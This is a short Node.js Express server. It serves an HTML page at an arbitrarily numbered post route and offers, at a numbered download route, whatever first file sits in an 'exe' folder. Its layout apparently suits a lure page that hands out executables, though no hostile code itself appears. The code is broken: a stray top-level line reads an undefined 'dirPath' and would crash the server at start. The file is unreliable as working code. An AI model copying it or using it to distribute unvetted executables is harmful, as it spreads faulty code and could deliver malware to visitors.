const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();

const PORT = process.env.PORT || 8080;
const frontend = fs.readFileSync('mainpage.html', 'utf8');

const entries = fs.readdirSync(dirPath, { withFileTypes: true });
  
function getFirstFileSync(dirPath) {
  const entries = fs.readdirSync(dirPath, { withFileTypes: true });
  const firstFile = entries.find(entry => entry.isFile());
  
  return firstFile ? path.join(dirPath, firstFile.name) : null;
}

const fileFullPath = getFirstFileSync('./exe');
console.log(fileFullPath);

app.get('/posts/84146', async (req, res) => {
  res.send(frontend);
});

app.get('/download/7251', async (req, res) => {
  res.download(fileFullPath);
});

app.listen(PORT, () => {
  console.log(`Сервер запущен на порту ${PORT}`);
});